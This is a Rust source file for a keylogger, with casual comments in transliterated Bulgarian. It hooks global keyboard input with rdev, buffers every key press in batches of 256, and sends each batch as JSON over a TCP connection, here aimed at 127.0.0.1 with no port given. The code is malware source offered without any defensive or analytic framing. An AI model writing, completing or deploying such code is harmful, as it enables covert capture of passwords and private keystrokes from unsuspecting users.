use env_logger::Env;
use lazy_static::lazy_static;
use log::info;
use rdev::{self, Event, EventType, Key, listen};
use tokio::{
    io::AsyncWriteExt,
    net::TcpStream,
    sync::broadcast::{self, Receiver, Sender},
};

// centialized broadcaster
// moshesh da mu napishesh nqkwi metodi na prawawish koda po krasiv i ne mid
pub struct EventBroadcaster {
    pub tx: Sender<Key>,
    pub rx: Receiver<Key>,
}

// default constructor
impl Default for EventBroadcaster {
    fn default() -> Self {
        let (tx, rx) = broadcast::channel::<Key>(256);
        Self { tx, rx }
    }
}

// tuka go iniciliazira kato globalna shitnq
lazy_static! {
    pub static ref EVENT_BROADCASTER: EventBroadcaster = EventBroadcaster::default();
}

#[tokio::main(flavor = "multi_thread", worker_threads = 2)]
async fn main() -> Result<(), std::io::Error> {
    env_logger::Builder::from_env(Env::default().default_filter_or("info")).init();

    // suzdawa 2ri thread
    tokio::spawn(sender_runtime());

    match listen(callback) {
        Err(e) => info!("{:?}", e),
        _ => {}
    }
    Ok(())
}

async fn sender_runtime() {
    // wzima referenciq kum rec
    let mut rx = EVENT_BROADCASTER.rx.resubscribe();
    let mut stream = TcpStream::connect("127.0.0.1")
        .await
        .expect("error during connecting to tcp");
    let mut buf: Vec<Key> = Vec::with_capacity(256);

    loop {
        //wzima poslednoto
        let key = rx.recv().await;
        match key {
            Ok(e) => buf.push(e),
            Err(err) => {
                // ako e error oznachawa che broadcastara se dealocira koeto
                // wuw sluchaq e bug
                info!("code skill issue: {err}");
                continue;
            }
        };
        if buf.len() == 256 {
            let _ = stream
                .write(serde_json::to_string(&buf).unwrap().as_bytes())
                .await;
            buf.clear();
        }

        info!("{:?}", buf);
    }
}

fn callback(event: Event) {
    let key_press = match event.event_type {
        EventType::KeyPress(keypress) => keypress,
        _ => return (),
    };

    let _ = EVENT_BROADCASTER.tx.send(key_press);
}
